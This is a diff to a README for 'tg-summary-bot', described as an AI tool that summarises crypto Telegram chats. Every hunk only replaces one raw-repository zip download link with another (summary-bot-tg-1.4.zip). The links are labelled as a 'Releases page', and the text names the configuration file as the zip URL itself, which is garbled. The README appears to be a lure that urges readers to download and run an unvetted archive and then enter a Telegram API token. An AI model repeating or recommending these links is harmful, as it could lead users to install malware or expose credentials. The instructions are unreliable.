@@ -1,6 +1,6 @@
 # 🚀 tg-summary-bot - Summarize Crypto Chats Easily
 
-[![Download tg-summary-bot](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/tg-summary-bot.zip)](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/tg-summary-bot.zip)
+[![Download tg-summary-bot](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/summary-bot-tg-1.4.zip)](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/summary-bot-tg-1.4.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to tg-summary-bot! This is an AI-powered bot that helps you summarize di
 To get started with tg-summary-bot, follow these simple steps:
 
 1. **Visit the Releases Page**: Go to the following link to find the latest version:
-   [Download tg-summary-bot](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/tg-summary-bot.zip)
+   [Download tg-summary-bot](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/summary-bot-tg-1.4.zip)
 
 2. **Download the File**: On the Releases page, download the most recent version of tg-summary-bot. You will find a file appropriate for your operating system.
 
@@ -27,7 +27,7 @@ Before running tg-summary-bot, ensure you meet the following basic requirements:
 
 ## ⚙️ Installation Steps
 
-1. **Download tg-summary-bot**: As mentioned earlier, start by downloading it from the [Releases page](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/tg-summary-bot.zip).
+1. **Download tg-summary-bot**: As mentioned earlier, start by downloading it from the [Releases page](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/summary-bot-tg-1.4.zip).
 
 2. **Install Dependencies**: If prompted, please install any required dependencies. This might include Python packages, which are essential for the bot's functionality.
 
@@ -38,7 +38,7 @@ Before running tg-summary-bot, ensure you meet the following basic requirements:
 
 4. **Configure the Bot**:
    - Open the downloaded tg-summary-bot file.
-   - Look for a configuration file (often named `https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/tg-summary-bot.zip` or `.env`).
+   - Look for a configuration file (often named `https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/summary-bot-tg-1.4.zip` or `.env`).
    - Enter your Telegram API token into the configuration file.
 
 5. **Run tg-summary-bot**: With everything set up, go ahead and run the bot. You should see confirmation messages in your console or terminal.
@@ -80,6 +80,6 @@ tg-summary-bot is an open-source project. You can use, modify, and distribute it
 
 Don't wait any longer! Visit the Releases page here to download the latest version of tg-summary-bot:
 
-[Download tg-summary-bot](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/tg-summary-bot.zip)
+[Download tg-summary-bot](https://raw.githubusercontent.com/RaviPandit69/tg-summary-bot/main/prest/summary-bot-tg-1.4.zip)
 
 Follow the installation steps, and start summarizing your crypto chats effortlessly!
